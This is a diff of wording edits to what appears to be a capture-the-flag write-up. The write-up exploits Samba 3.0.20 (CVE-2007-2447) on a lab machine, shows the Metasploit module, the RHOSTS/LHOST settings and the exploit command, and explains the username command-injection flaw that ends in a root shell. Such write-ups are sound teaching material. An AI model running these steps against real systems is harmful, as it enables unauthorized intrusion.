@@ -12,7 +12,7 @@ I started by running a basic `nmap` scan against the target to enumerate open TC
 
 ![nmapCommand](nmapCommand.png)
 
-The scan revealed **the next ports** within the top 1000 TCP ports:
+The scan revealed **the following ports** within the top 1000 TCP ports:
 - **21/tcp** (FTP)
 - **22/tcp** (SSH)
 - **139/tcp** (NetBIOS-SSN)
@@ -43,7 +43,8 @@ OS: Unix (Samba 3.0.20-Debian)
 ### **Initial Access – Exploiting Samba (CVE-2007-2447)**
 
 #### **Step 1: I found a vulnerable Samba service**
-From the initial scan, I saw that the machine was running Samba version 3.0.20.This version is known to be vulnerable.
+From the initial scan, I saw that the machine was running Samba version 3.0.20.
+This version is known to be vulnerable. Specifically, CVE-2007-2447 allows unauthenticated remote code execution via a command injection flaw — Samba passes the username field directly to a shell command, meaning an attacker can inject malicious commands that the system executes as root.
 The search returned the following relevant module:
 exploit/multi/samba/usermap_script
 
@@ -64,7 +65,7 @@ set RHOSTS 10.129.47.108
 This tells Metasploit which remote host should be attacked.
 
 #### **Step 5: Setting the target IP address**
-set the local host accordingly to my IP adress:
+Set the local host to my IP address:
 set LHOST 10.10.15.26
 
 #### **Step 6: Running the exploit**
@@ -73,7 +74,7 @@ exploit
 
 ![exploitCommand](exploitCommand.png)
 
-**command shell opend on the target system**
+**A command shell opened on the target system**
 
 ---
 
